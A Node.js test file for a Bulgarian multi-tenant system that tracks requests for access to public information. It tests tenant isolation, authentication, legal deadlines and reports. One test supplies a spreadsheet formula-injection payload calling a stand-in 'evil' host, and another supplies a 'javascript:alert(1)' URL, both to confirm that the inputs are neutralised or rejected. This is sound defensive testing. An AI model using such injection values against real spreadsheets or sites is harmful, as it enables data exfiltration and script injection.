/* node --test tests/ */
const test = require('node:test'), assert = require('node:assert/strict');
const { load } = require('./mock-google');

const orgData = (over = {}) => Object.assign({
  name: 'Община Тест', type: 'Община', basis: 'чл. 3, ал. 1', eik: '000696327', oblast: 'София', municipality: 'Столична', city: 'София', postcode: '1000',
  address: 'ул. Първа 1', phone: '+35929000000', email: 'obshtina@example.org', web: 'https://example.org', headName: 'Иван Иванов', headPosition: 'Кмет',
  unitName: 'Деловодство', unitAddress: 'ул. Първа 1', unitEmail: 'zdoi@example.org', unitPhone: '029000001', unitHours: '9–17 ч.', court: 'Административен съд София-град',
  adminName: 'Мария Петрова', adminPosition: 'Юрисконсулт', adminEmail: 'admin@example.org', adminPhone: '0888000000', adminUsername: 'mpetrova', declare: true
}, over);
const HASH = c => c.repeat(44);
const tokenOf = link => link.split('/').pop();
const lastLink = g => /https:\S+#\/activate\/\S+/.exec(g.mails.filter(m => /activate/.test(m.body)).at(-1).body)[0];

function operator(g) {
  const link = g.setup();
  const r = g.call('activate', { no: '00000000', username: 'admin', token: tokenOf(link), hash: HASH('o') });
  assert.equal(r.ok, true, JSON.stringify(r));
  return g.call('login', { no: '00000000', username: 'admin', hash: HASH('o') }).token;
}
function approve(g, op, over) {
  const a = g.call('public.apply', orgData(over));
  assert.equal(a.ok, true, JSON.stringify(a));
  const d = g.call('op.decide', { id: a.id, approve: true }, op);
  assert.equal(d.ok, true, JSON.stringify(d));
  const link = lastLink(g);
  const m = /activate\/(\d+)\/([^/]+)\/(\w+)/.exec(link);
  assert.equal(g.call('activate', { no: m[1], username: m[2], token: m[3], hash: HASH('p') }).ok, true);
  const l = g.call('login', { no: m[1], username: m[2], hash: HASH('p') });
  assert.equal(l.ok, true, JSON.stringify(l));
  return { no: d.no, token: l.token, username: m[2] };
}
const caseData = (over = {}) => Object.assign({
  kind: 'Достъп до обществена информация', regDate: '2026-11-02', channel: 'Писмено', applicantType: 'Гражданин', applicantName: 'Петър Петров',
  applicantAddress: 'ул. Втора 2', subject: 'Договори за 2025 г.', form: 'копия на материален носител'
}, over);
const updateData = (c, over = {}) => Object.assign({}, c, over);
const setupTwo = () => {
  const g = load(), op = operator(g);
  const a = approve(g, op);
  const b = approve(g, op, { name: 'Агенция Б', type: 'Друга администрация', eik: '121758615', adminUsername: 'bobo', adminEmail: 'b@example.org', email: 'b-org@example.org' });
  return { g, op, a, b };
};

test('EIK validation accepts real numbers and rejects bad checksums', () => {
  const { t } = load();
  assert.equal(t.validEik_('000696327'), true);
  assert.equal(t.validEik_('000696328'), false);
  assert.equal(t.validEik_('12345'), false);
});

test('holidays and terms: deadline ending on non-working day moves forward', () => {
  const { t } = load();
  assert.equal(t.term_('2026-12-10', 14), '2026-12-29'); // 24–26.12 празници, 27 неделя, 28 почивен вместо 26 (събота)
  assert.equal(t.term_('2026-04-30', 1), '2026-05-04'); // 01.05 празник (петък), 02–03 уикенд
  assert.equal(t.term_('2026-04-02', 8), '2026-04-14'); // Великден 12.04.2026: 10–13 са неработни
});

test('registration requires all organization data and declaration', () => {
  const g = load(); operator(g);
  for (const k of ['address', 'headName', 'unitEmail', 'court', 'adminEmail']) {
    const r = g.call('public.apply', orgData({ [k]: '' }));
    assert.equal(r.ok, false, k);
  }
  assert.equal(g.call('public.apply', orgData({ declare: false })).ok, false);
  assert.equal(g.call('public.apply', orgData({ eik: '123456789' })).error, 'eik');
});

test('organization cannot log in before approval; duplicates are rejected', () => {
  const g = load(), op = operator(g);
  const a = g.call('public.apply', orgData());
  assert.equal(a.ok, true);
  assert.equal(g.call('public.apply', orgData()).error, 'duplicate');
  assert.equal(g.call('op.apps', {}, op).apps[0].status, 'Чака одобрение');
  assert.equal(g.books.size, 1, 'no organization spreadsheet before approval');
});

test('rejection records reason and creates no spreadsheet', () => {
  const g = load(), op = operator(g);
  const a = g.call('public.apply', orgData());
  assert.equal(g.call('op.decide', { id: a.id, approve: false }, op).error, 'required');
  assert.equal(g.call('op.decide', { id: a.id, approve: false, reason: 'Неверни данни' }, op).ok, true);
  assert.equal(g.call('op.apps', {}, op).apps[0].status, 'Отказана');
  assert.equal(g.books.size, 1);
  assert.equal(g.call('op.decide', { id: a.id, approve: true }, op).error, 'state');
});

test('each organization gets its own spreadsheet in the data folder', () => {
  const { g, a, b } = setupTwo();
  assert.equal(g.books.size, 3); // главна + 2
  assert.notEqual(a.no, b.no);
  const orgBooks = [...g.books.values()].filter(x => /^ЗДОИ4You – \d{8}/.test(x.name));
  assert.equal(orgBooks.length, 2);
  orgBooks.forEach(x => {
    assert.equal(x.folder, 'folder1');
    ['Профил', 'Потребители', 'Преписки', 'Събития', 'Документи', 'Чл. 15', 'Броячи', 'Дневник'].forEach(n => assert.ok(x.getSheetByName(n), n));
    assert.equal(x.getSheetByName('Лист1'), null);
  });
  const masterSheets = [...g.books.values()].find(x => /главна/.test(x.name)).sheets.map(s => s.name);
  assert.ok(!masterSheets.includes('Преписки'), 'cases are never in the master spreadsheet');
});

test('tenant isolation: same register number, separate data, no cross access', () => {
  const { g, a, b } = setupTwo();
  const ca = g.call('case.create', caseData({ subject: 'ТАЙНА НА А' }), a.token);
  const cb = g.call('case.create', caseData({ subject: 'ДАННИ НА Б' }), b.token);
  assert.equal(ca.regNo, cb.regNo, 'numbering is per organization');
  assert.equal(g.call('case.get', { regNo: ca.regNo }, a.token).case.subject, 'ТАЙНА НА А');
  assert.equal(g.call('case.get', { regNo: cb.regNo }, b.token).case.subject, 'ДАННИ НА Б');
  assert.ok(!JSON.stringify(g.call('case.list', {}, b.token)).includes('ТАЙНА НА А'));
  // опит да се подаде чужд номер или таблица в данните не променя организацията
  const forged = g.call('case.list', { no: a.no, sheetId: 'book2', org: a.no }, b.token);
  assert.ok(!JSON.stringify(forged).includes('ТАЙНА НА А'));
  const orgBooks = [...g.books.values()].filter(x => /^ЗДОИ4You – \d{8}/.test(x.name));
  const hasA = orgBooks.filter(x => JSON.stringify(x.getSheetByName('Преписки').cells).includes('ТАЙНА НА А'));
  assert.equal(hasA.length, 1, 'stored in exactly one spreadsheet');
});

test('login needs the right organization number, user and password', () => {
  const { g, a, b } = setupTwo();
  assert.equal(g.call('login', { no: b.no, username: a.username, hash: HASH('p') }).error, 'login');
  assert.equal(g.call('login', { no: a.no, username: a.username, hash: HASH('x') }).error, 'login');
  const u = g.call('login', { no: a.no, username: 'nobody', hash: HASH('x') });
  const w = g.call('login', { no: a.no, username: a.username, hash: HASH('x') });
  assert.equal(u.message, w.message, 'no user enumeration');
});

test('lockout after repeated failures, then recovery', () => {
  const { g, a } = setupTwo();
  for (let i = 0; i < 5; i++) g.call('login', { no: a.no, username: a.username, hash: HASH('x') });
  assert.equal(g.call('login', { no: a.no, username: a.username, hash: HASH('p') }).error, 'locked');
  g.advance(16 * 60e3);
  assert.equal(g.call('login', { no: a.no, username: a.username, hash: HASH('p') }).ok, true);
});

test('invitation is single use and expires', () => {
  const g = load(), op = operator(g);
  const app = g.call('public.apply', orgData());
  g.call('op.decide', { id: app.id, approve: true }, op);
  const m = /activate\/(\d+)\/([^/]+)\/(\w+)/.exec(lastLink(g));
  assert.equal(g.call('login', { no: m[1], username: m[2], hash: HASH('p') }).error, 'login', 'no password before activation');
  assert.equal(g.call('activate', { no: m[1], username: m[2], token: m[3], hash: HASH('p') }).ok, true);
  assert.equal(g.call('activate', { no: m[1], username: m[2], token: m[3], hash: HASH('q') }).error, 'invite');
  const u = g.call('login', { no: m[1], username: m[2], hash: HASH('p') }).token;
  const r = g.call('users.save', { isNew: true, username: 'emp1', name: 'Служител', position: 'Експерт', email: 'emp@example.org', role: 'Служител' }, u);
  assert.equal(r.created, true);
  const e = /activate\/(\d+)\/([^/]+)\/(\w+)/.exec(lastLink(g));
  g.advance(8 * 864e5);
  assert.equal(g.call('activate', { no: e[1], username: e[2], token: e[3], hash: HASH('e') }).error, 'invite');
});

test('roles: staff cannot administer, organization cannot reach operator actions', () => {
  const { g, a } = setupTwo();
  g.call('users.save', { isNew: true, username: 'emp1', name: 'Служител', position: 'Експерт', email: 'emp@example.org', role: 'Служител' }, a.token);
  const e = /activate\/(\d+)\/([^/]+)\/(\w+)/.exec(lastLink(g));
  g.call('activate', { no: e[1], username: e[2], token: e[3], hash: HASH('e') });
  const staff = g.call('login', { no: a.no, username: 'emp1', hash: HASH('e') }).token;
  assert.equal(g.call('case.create', caseData(), staff).ok, true);
  for (const act of ['users.list', 'users.save', 'org.save', 'log.list']) assert.equal(g.call(act, {}, staff).error, 'role', act);
  for (const act of ['op.apps', 'op.orgs', 'op.decide', 'op.log']) assert.equal(g.call(act, {}, a.token).error, 'role', act);
  assert.equal(g.call('case.list', {}, 'x'.repeat(64)).error, 'session');
  assert.equal(g.call('case.list', {}).error, 'session');
});

test('deactivated user and suspended organization lose access immediately', () => {
  const { g, op, a, b } = setupTwo();
  assert.equal(g.call('case.list', {}, b.token).ok, true);
  assert.equal(g.call('op.status', { no: b.no, status: 'Спряна' }, op).ok, true);
  assert.equal(g.call('case.list', {}, b.token).error, 'session');
  assert.equal(g.call('login', { no: b.no, username: b.username, hash: HASH('p') }).error, 'login');
  g.call('users.save', { isNew: true, username: 'emp1', name: 'С', position: 'Е', email: 'e@example.org', role: 'Служител' }, a.token);
  const e = /activate\/(\d+)\/([^/]+)\/(\w+)/.exec(lastLink(g));
  g.call('activate', { no: e[1], username: e[2], token: e[3], hash: HASH('e') });
  const staff = g.call('login', { no: a.no, username: 'emp1', hash: HASH('e') }).token;
  assert.equal(g.call('case.list', {}, staff).ok, true);
  g.call('users.save', { username: 'emp1', name: 'С', position: 'Е', email: 'e@example.org', role: 'Служител', active: false }, a.token);
  assert.equal(g.call('case.list', {}, staff).error, 'session');
});

test('the last active administrator cannot be removed', () => {
  const { g, a } = setupTwo();
  const r = g.call('users.save', { username: a.username, name: 'М', position: 'Ю', email: 'admin@example.org', role: 'Служител' }, a.token);
  assert.equal(r.error, 'lastadmin');
});

test('session expires after 30 minutes and can be extended; logout ends it', () => {
  const { g, a } = setupTwo();
  g.advance(29 * 60e3);
  assert.equal(g.call('extend', {}, a.token).ok, true);
  g.advance(29 * 60e3);
  assert.equal(g.call('case.list', {}, a.token).ok, true);
  g.advance(2 * 60e3);
  assert.equal(g.call('case.list', {}, a.token).error, 'session');
  const t = g.call('login', { no: a.no, username: a.username, hash: HASH('p') }).token;
  g.call('logout', {}, t);
  assert.equal(g.call('case.list', {}, t).error, 'session');
});

test('no API response ever contains password material', () => {
  const { g, op, a } = setupTwo();
  const all = [g.call('users.list', {}, a.token), g.call('org.bootstrap', {}, a.token), g.call('op.orgs', {}, op), g.call('op.apps', {}, op)];
  all.forEach(r => {
    assert.equal(r.ok, true);
    const s = JSON.stringify(r);
    assert.ok(!/"(salt|hash|inviteHash)"/.test(s), s.slice(0, 200));
    assert.ok(!/sheetId/.test(JSON.stringify(g.call('op.orgs', {}, op))));
  });
});

test('formula-looking input is stored inert and read back unchanged', () => {
  const { g, a } = setupTwo();
  const r = g.call('case.create', caseData({ applicantName: '=IMPORTXML("http://evil","//a")', applicantPhone: '+359888' }), a.token);
  const c = g.call('case.get', { regNo: r.regNo }, a.token).case;
  assert.equal(c.applicantName, '=IMPORTXML("http://evil","//a")');
  assert.equal(c.applicantPhone, '+359888');
  const book = [...g.books.values()].find(x => JSON.stringify(x.getSheetByName('Преписки')?.cells || []).includes('IMPORTXML'));
  assert.ok(book.getSheetByName('Преписки').cells[1].some(v => String(v).startsWith("'=IMPORTXML")));
});

test('deadlines follow arts. 28–31 and the clarify cycle', () => {
  const { g, a } = setupTwo();
  const reg = g.call('case.create', caseData({ regDate: '2026-11-02' }), a.token).regNo;
  let c = g.call('case.get', { regNo: reg }, a.token).case;
  assert.equal(c.due, '2026-11-16');
  g.call('doc.create', { type: 'extend30', regNo: reg, title: 'x', date: '2026-11-03', fields: { days: '10', reason: 'голямо количество' } }, a.token);
  c = g.call('case.get', { regNo: reg }, a.token).case;
  assert.equal(c.due, '2026-11-26');
  assert.equal(g.call('doc.create', { type: 'extend30', regNo: reg, fields: { days: '11', reason: 'x' } }, a.token).error, 'value');
  g.call('doc.create', { type: 'clarify', regNo: reg, title: 'x', date: '2026-11-04', fields: { what: 'кои договори' } }, a.token);
  c = g.call('case.get', { regNo: reg }, a.token).case;
  assert.equal(c.status, 'Чака уточняване');
  assert.equal(c.due, '2026-12-04');
  const u = g.call('case.update', updateData(c, { clarifyGot: '2026-11-10' }), a.token);
  assert.equal(u.ok, true, JSON.stringify(u));
  c = g.call('case.get', { regNo: reg }, a.token).case;
  assert.equal(c.status, 'В обработка');
  assert.equal(c.due, '2026-12-04'); // 10.11 + 14 + 10
});

test('decision documents validate the law and update the case', () => {
  const { g, a } = setupTwo();
  const reg = g.call('case.create', caseData(), a.token).regNo;
  const short = { scope: 'пълен', accessDays: '10', place: 'х', accessForm: 'х', costs: '0' };
  assert.equal(g.call('doc.create', { type: 'grant', regNo: reg, fields: short }, a.token).error, 'accessDays');
  const ok = g.call('doc.create', { type: 'grant', regNo: reg, title: 'Решение', date: '2026-11-05', fields: { ...short, accessDays: '30' } }, a.token);
  assert.equal(ok.ok, true, JSON.stringify(ok));
  assert.equal(ok.no, 'РЕШ-2026-0001');
  const c = g.call('case.get', { regNo: reg }, a.token);
  assert.equal(c.case.outcome, 'Предоставен достъп');
  assert.equal(c.case.decisionNo, 'РЕШ-2026-0001');
  assert.equal(c.case.due, '', 'no pending deadline after a decision');
  assert.equal(c.docs.length, 1);
  const again = g.call('doc.get', { id: ok.id }, a.token);
  assert.deepEqual(again.payload, ok.payload);
  assert.equal(g.call('doc.create', { type: 'refuse', regNo: reg, fields: { groundKey: 'zz', factual: 'x' } }, a.token).error, 'value');
  assert.equal(g.call('doc.create', { type: 'refuse', regNo: reg, fields: { groundKey: 't2' } }, a.token).error, 'required');
});

test('a document from one organization is unreachable from another', () => {
  const { g, a, b } = setupTwo();
  const reg = g.call('case.create', caseData(), a.token).regNo;
  const doc = g.call('doc.create', { type: 'noinfo', regNo: reg, title: 'x', fields: {} }, a.token);
  assert.equal(doc.ok, true, JSON.stringify(doc));
  assert.equal(g.call('doc.get', { id: doc.id }, b.token).error, 'notfound');
});

test('annual report counts by year, outcome and refusal ground', () => {
  const { g, a } = setupTwo();
  const r1 = g.call('case.create', caseData({ regDate: '2025-03-03' }), a.token).regNo;
  g.call('case.create', caseData({ regDate: '2025-04-01', kind: 'Повторно използване на информация', applicantType: 'Журналист или медия' }), a.token);
  g.call('case.create', caseData({ regDate: '2026-01-05' }), a.token);
  g.call('doc.create', { type: 'refuse', regNo: r1, title: 'x', date: '2025-03-10', fields: { groundKey: 't3', factual: 'предоставена е' } }, a.token);
  const s = g.call('report.stats', { year: '2025' }, a.token).stats;
  assert.equal(s.total, 2);
  assert.equal(s.access, 1);
  assert.equal(s.reuse, 1);
  assert.equal(s.refusals, 1);
  assert.equal(s.byOutcome['Отказ'], 1);
  assert.equal(s.byApplicant['Журналист или медия'], 1);
  assert.ok(Object.entries(s.grounds).some(([k, v]) => k.includes('т. 3') && v === 1));
  const d = g.call('doc.create', { type: 'report', title: 'x', fields: { year: '2025' } }, a.token);
  assert.equal(d.payload.stats.total, 2);
});

test('article 15 items are saved per item and validated', () => {
  const { g, a } = setupTwo();
  assert.equal(g.call('art15.save', { item: '18', text: 'x' }, a.token).error, 'value');
  assert.equal(g.call('art15.save', { item: '4', text: 'x', url: 'javascript:alert(1)' }, a.token).error, 'value');
  assert.equal(g.call('art15.save', { item: '4', text: 'Деловодство', url: 'https://example.org/z' }, a.token).ok, true);
  assert.equal(g.call('art15.save', { item: '4', text: 'Ново', url: '' }, a.token).ok, true);
  const items = g.call('art15.get', {}, a.token).items;
  assert.equal(items.length, 1);
  assert.equal(items[0].text, 'Ново');
});

test('forgot password responds the same for existing and unknown accounts', () => {
  const { g, a } = setupTwo();
  const before = g.mails.length;
  const x = g.call('forgot', { no: a.no, username: a.username });
  const y = g.call('forgot', { no: a.no, username: 'nobody' });
  assert.deepEqual(Object.keys(x).sort(), Object.keys(y).sort());
  assert.equal(g.mails.length, before + 1);
  const m = /activate\/(\d+)\/([^/]+)\/(\w+)/.exec(lastLink(g));
  assert.equal(g.call('login', { no: a.no, username: a.username, hash: HASH('p') }).ok, true, 'old password still works until reset');
  assert.equal(g.call('activate', { no: m[1], username: m[2], token: m[3], hash: HASH('n') }).ok, true);
  assert.equal(g.call('login', { no: a.no, username: a.username, hash: HASH('n') }).ok, true);
});

test('password change requires the current password', () => {
  const { g, a } = setupTwo();
  assert.equal(g.call('password', { current: HASH('z'), next: HASH('n') }, a.token).error, 'password');
  assert.equal(g.call('password', { current: HASH('p'), next: HASH('n') }, a.token).ok, true);
  assert.equal(g.call('login', { no: a.no, username: a.username, hash: HASH('n') }).ok, true);
});

test('tables grow past the default sheet size of Google (26 columns, 1000 rows)', () => {
  const { g, a } = setupTwo();
  const book = [...g.books.values()].find(x => /^ЗДОИ4You – \d{8}/.test(x.name) && x.name.includes(a.no));
  const sheet = book.getSheetByName('Преписки');
  assert.ok(sheet.getMaxColumns() > 26, 'cases need more than 26 columns');
  sheet.maxRows = sheet.getLastRow() + 1; // следващият запис е точно в края
  assert.equal(g.call('case.create', caseData(), a.token).ok, true);
  const second = g.call('case.create', caseData(), a.token);
  assert.equal(second.ok, true, JSON.stringify(second));
  assert.equal(g.call('case.get', { regNo: second.regNo }, a.token).case.applicantName, 'Петър Петров');
});

test('honeypot silently drops bots', () => {
  const g = load(); operator(g);
  const r = g.call('public.apply', orgData({ hp: 'bot' }));
  assert.equal(r.ok, true);
  assert.equal(r.id, 'ok');
});
